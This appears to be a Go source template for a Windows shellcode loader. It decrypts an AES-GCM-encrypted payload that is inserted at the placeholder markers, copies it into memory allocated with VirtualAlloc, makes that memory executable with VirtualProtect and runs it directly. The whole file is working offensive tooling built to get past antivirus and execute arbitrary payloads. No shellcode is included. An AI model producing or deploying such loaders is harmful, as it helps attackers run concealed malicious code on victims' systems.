//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Auto-replace markers for key and payload

<PAYLOAD>

<KEY>


//Start
func check(err error) {
	if err != nil {
		panic(err)
	}
}

func decryptAES(ciphertext []byte, eKey []byte) (plaintext []byte) {
	c, err := aes.NewCipher(eKey)
	check(err)

	gcm, err := cipher.NewGCM(c)
	check(err)

	nonceSize := gcm.NonceSize()

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err = gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	return
}

func useSysCall(sc []byte) {

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}

	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}

func main() {
	useSysCall(decryptAES(buf, key))
}
